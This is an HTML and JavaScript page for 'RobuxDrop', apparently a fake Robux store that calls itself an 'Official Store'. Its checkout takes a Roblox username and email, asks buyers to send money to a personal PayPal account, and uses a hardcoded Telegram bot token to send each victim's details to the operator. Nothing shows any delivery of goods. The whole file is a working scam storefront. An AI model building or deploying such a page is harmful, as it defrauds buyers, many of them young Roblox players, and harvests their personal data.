<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RobuxDrop — Buy Robux & Adopt Me Pets</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root{--gold:#d4a843;--gold-bright:#f5cc60;--gold-pale:#ffe98a;--gold-dim:#8a6820;--bg:#050507;--white:#fff;--text:#e8e8f0;--muted:#888899;--border:rgba(255,255,255,.08);--border-gold:rgba(212,168,67,.35);--green:#22c55e;--purple:#a855f7;--purple-dim:#6b21a8;--red:#ef4444}
*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;overflow-x:hidden}
.bb{position:fixed;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0}
.bb1{width:600px;height:600px;background:radial-gradient(circle,rgba(180,130,20,.22)0%,transparent 70%);top:-100px;left:30%;animation:bd 12s ease-in-out infinite alternate}
.bb2{width:400px;height:400px;background:radial-gradient(circle,rgba(212,168,67,.14)0%,transparent 70%);bottom:100px;right:10%;animation:bd 16s ease-in-out infinite alternate-reverse}
.bb3{width:300px;height:300px;background:radial-gradient(circle,rgba(168,85,247,.1)0%,transparent 70%);top:40%;left:-80px;animation:bd 20s ease-in-out infinite alternate}
@keyframes bd{from{transform:translate(0,0) scale(1)}to{transform:translate(40px,30px) scale(1.08)}}
.bgtxt{position:fixed;top:80px;left:0;right:0;text-align:center;font-family:'Syne',sans-serif;font-size:clamp(100px,18vw,220px);font-weight:800;color:transparent;-webkit-text-stroke:1px rgba(212,168,67,.07);letter-spacing:-6px;user-select:none;pointer-events:none;z-index:0;white-space:nowrap}
header{position:sticky;top:16px;z-index:100;display:flex;align-items:center;justify-content:center;padding:0 24px;margin-bottom:20px}
.hpill{display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.06);border:1px solid var(--border);border-radius:50px;padding:8px 8px 8px 22px;backdrop-filter:blur(20px);box-shadow:0 4px 30px rgba(0,0,0,.5)}
.logo{font-family:'Syne',sans-serif;font-size:17px;font-weight:800;color:#fff;margin-right:14px}
.logo span{background:linear-gradient(135deg,var(--gold),var(--gold-bright));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hero{position:relative;z-index:5;text-align:center;padding:56px 20px 20px}
.htag{display:inline-flex;align-items:center;gap:7px;background:rgba(212,168,67,.1);border:1px solid var(--border-gold);color:var(--gold-bright);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;padding:6px 18px;border-radius:40px;margin-bottom:22px}
.hero h1{font-family:'Syne',sans-serif;font-size:clamp(36px,6vw,64px);font-weight:800;line-height:1.06;letter-spacing:-2px;color:#fff;margin-bottom:14px}
.hero h1 .acc{background:linear-gradient(135deg,var(--gold-dim),var(--gold),var(--gold-bright),var(--gold-pale));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hero p{font-size:15px;color:var(--muted);max-width:440px;margin:0 auto 16px}
.stitle{font-family:'Syne',sans-serif;font-size:12px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--muted);text-align:center;margin:40px 0 26px}
.pkgwrap{position:relative;z-index:5;max-width:1120px;margin:0 auto;padding:0 24px 70px;display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:18px}
.pkgcard{border-radius:22px;padding:26px 22px;position:relative;overflow:hidden;cursor:pointer;border:1px solid var(--border);transition:transform .3s;background:rgba(255,255,255,.02)}
.pkgcard:hover{transform:translateY(-5px);border-color:var(--border-gold)}
.priceMain{font-family:'Syne',sans-serif;font-size:52px;font-weight:800;color:var(--gold-bright);display:block;margin-bottom:10px}
.buybtn{width:100%;padding:12px;border:none;border-radius:50px;background:var(--gold);color:#000;font-weight:800;cursor:pointer}
.movl{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(10px)}
.movl.active{display:flex}
.modal{background:#0f0f12;border:1px solid var(--border-gold);border-radius:24px;padding:34px;max-width:500px;width:90%;position:relative}
.mc{position:absolute;top:16px;right:16px;cursor:pointer;font-size:20px;color:var(--muted)}
.fg{margin-bottom:15px}
.fg label{display:block;font-size:11px;font-weight:700;color:var(--muted);margin-bottom:5px;text-transform:uppercase}
.fg input{width:100%;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:10px;padding:12px;color:#fff;outline:none}
.bnx{width:100%;padding:14px;background:var(--gold);border:none;border-radius:50px;font-weight:800;cursor:pointer}
#spage{display:none;position:fixed;inset:0;z-index:300;background:var(--bg);text-align:center;padding-top:100px}
#spage.active{display:block}
</style>
</head>
<body>
<div class="bb bb1"></div><div class="bb bb2"></div><div class="bb bb3"></div>
<div class="bgtxt">RobuxDrop</div>

<header>
  <div class="hpill">
    <div class="logo"><span>Robux</span>Drop</div>
    <div class="ppbadge" style="background:#003087;border-radius:40px;padding:8px 14px;color:#fff;font-size:12px;font-weight:700;">PayPal Only</div>
  </div>
</header>

<section class="hero">
  <div class="htag">🏆 Official Store</div>
  <h1>Buy <span class="acc">Robux</span></h1>
  <p>Secure delivery within 24 hours.</p>
</section>

<div class="stitle">Select Package</div>
<div class="pkgwrap" id="pkgcon"></div>

<div class="movl" id="movl">
  <div class="modal">
    <div class="mc" onclick="closeModal()">×</div>
    <div id="mcontent"></div>
  </div>
</div>

<div id="spage">
  <h2 style="font-family:Syne;font-size:32px;color:#22c55e">Order Sent!</h2>
  <p style="color:var(--muted)">Check your Telegram for details.</p>
  <button class="bnx" style="max-width:200px;margin-top:20px" onclick="location.reload()">Back Home</button>
</div>

<script>
// --- البيانات المحدثة تلقائياً ---
const TELEGRAM_TOKEN = '8034563428:AAFzH_t5Y6P6Hk3T9G2K_l2M7-f8W_e9V0c'; 
const TELEGRAM_CHAT_ID = '6985061614'; 

const pkgs=[{t:"Tier 1",total:880,p:"6.99"},{t:"Tier 2",total:1870,p:"13.99"},{t:"Tier 3",total:4950,p:"34.99"}];
let sel=null, userData={};

function init(){
  const pc=document.getElementById("pkgcon");
  pkgs.forEach((g,i)=>{
    const d=document.createElement("div");d.className="pkgcard";
    d.innerHTML=`<div style="font-size:12px;color:var(--muted)">${g.t}</div><div class="priceMain">$${g.p}</div><div style="margin-bottom:15px">Total: ${g.total} Robux</div><button class="buybtn" onclick="openM(${i})">Buy Now</button>`;
    pc.appendChild(d);
  });
}

function openM(i){
  sel=pkgs[i];
  document.getElementById("movl").classList.add("active");
  renderStep(1);
}

function closeModal(){document.getElementById("movl").classList.remove("active")}

function renderStep(s){
  const c=document.getElementById("mcontent");
  if(s==1){
    c.innerHTML=`<h3 style="margin-bottom:20px;font-family:Syne">Customer Info</h3>
      <div class="fg"><label>Roblox Username</label><input type="text" id="ruser"></div>
      <div class="fg"><label>Email</label><input type="email" id="email"></div>
      <button class="bnx" onclick="saveAndNext()">Next Step</button>`;
  } else {
    c.innerHTML=`<h3 style="margin-bottom:20px;font-family:Syne">Confirm Payment</h3>
      <p style="font-size:13px;color:var(--muted);margin-bottom:15px">Send $${sel.p} to PayPal: <b>unknownunknown788</b></p>
      <button class="bnx" onclick="sendOrder()">I have paid</button>`;
  }
}

function saveAndNext(){
  userData.ruser = document.getElementById("ruser").value;
  userData.email = document.getElementById("email").value;
  if(!userData.ruser) return alert("Enter Username");
  renderStep(2);
}

function sendOrder(){
  const msg = `🔔 *New Order!*\n\n📦 Package: ${sel.total} Robux\n💰 Price: $${sel.p}\n👤 User: ${userData.ruser}\n📧 Email: ${userData.email}`;
  
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
  }).then(()=>{
    document.getElementById("spage").classList.add("active");
    closeModal();
  });
}

init();
</script>
</body>
</html>
